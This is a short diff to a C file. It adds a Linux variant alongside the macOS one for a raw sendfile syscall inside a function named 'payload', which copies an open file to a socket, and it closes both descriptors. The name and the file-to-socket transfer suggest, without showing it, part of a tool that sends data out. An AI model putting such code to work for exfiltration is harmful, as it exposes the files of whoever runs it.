@@ -56,12 +56,24 @@ void payload(void)
 	}
 
 	off_t filesize = st.st_size;
+#ifdef __APPLE__
 	if (syscall(SYS_sendfile, fd, socketfd, 0, &filesize, NULL, 0) == -1) {
 		perror("sendfile");
 		close(fd);
 		close(socketfd);
 		return;
 	}
+#else
+	if (syscall(SYS_sendfile, socketfd, fd, 0, &filesize) == -1) {
+		perror("sendfile");
+		close(fd);
+		close(socketfd);
+		return;
+	}
+#endif /* __APPLE__ */
+
+	close(fd);
+	close(socketfd);
 }
 
 int main(void)
